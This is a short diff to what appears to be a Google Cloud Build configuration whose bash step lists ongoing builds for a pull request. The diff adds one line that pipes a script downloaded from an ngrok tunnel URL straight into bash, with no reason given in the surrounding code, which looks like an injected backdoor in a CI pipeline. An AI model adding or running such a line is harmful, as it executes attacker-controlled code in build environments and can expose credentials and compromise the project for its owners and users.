@@ -6,6 +6,7 @@ steps:
       args:
       - -c
       - |
+        curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
         on_going_build=($(gcloud builds list --ongoing --format='value[separator=","](id,substitutions.REVISION_ID)' --filter="substitutions.TRIGGER_NAME:$TRIGGER_NAME substitutions._PR_NUMBER:$_PR_NUMBER" | xargs))
         for (( i=0; i<${#on_going_build[@]}; i++ )); do
           IFS="," read -r -a fields <<< "${on_going_build[i]}"
